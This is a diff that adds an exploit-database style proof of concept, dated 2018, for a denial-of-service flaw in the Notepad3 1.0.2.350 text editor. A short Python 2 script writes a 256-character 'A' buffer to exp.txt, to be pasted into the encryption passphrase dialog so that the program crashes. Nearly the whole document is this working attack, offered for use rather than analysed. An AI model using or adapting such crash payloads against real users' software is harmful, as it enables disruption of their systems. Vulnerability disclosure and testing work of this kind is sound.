@@ -1,0 +1,29 @@
+# Exploit Title: Notepad3 1.0.2.350 - Denial of Service (PoC)
+# Dork: N/A
+# Date: 2018-11-14
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://www.rizonesoft.com/
+# Software Link: https://netix.dl.sourceforge.net/project/notepad3/Notepad3%20Build%20350/Notepad3-1.0.2.350.exe
+# Software Link: https://datapacket.dl.sourceforge.net/project/notepad3/Notepad3%20Build%20350/Notepad3-1.0.2.350_x86.zip
+# Version: 1.0.2.350
+# Category: Dos
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# File / Set Encryption Passphrase / Encrypt using Passphrase
+
+#!/usr/bin/python
+    
+buffer = "A" * 256
+ 
+payload = buffer
+try:
+    f=open("exp.txt","w")
+    print "[+] Creating %s bytes evil payload." %len(payload)
+    f.write(payload)
+    f.close()
+    print "[+] File created!"
+except:
+    print "File cannot be created."
